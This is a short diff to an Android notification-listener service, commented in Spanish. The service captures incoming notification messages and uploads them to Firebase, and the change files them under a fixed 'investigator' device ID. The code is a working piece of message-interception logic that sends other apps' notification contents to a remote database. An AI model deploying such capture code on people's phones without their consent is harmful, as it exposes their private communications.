@@ -23,7 +23,9 @@ class NotificationService : NotificationListenerService() {
             )
             
             // Subimos el mensaje a la carpeta "mensajes_capturados" en Firebase
-            database.child("mensajes_capturados").push().setValue(mensaje)
+           // Usamos el número de serie del teléfono o un ID fijo para identificar al investigador
+            val idInvestigador = "Investigador_01" 
+            database.child("dispositivos").child(idInvestigador).child("mensajes").push().setValue(mensaje) 
         }
     }
 }
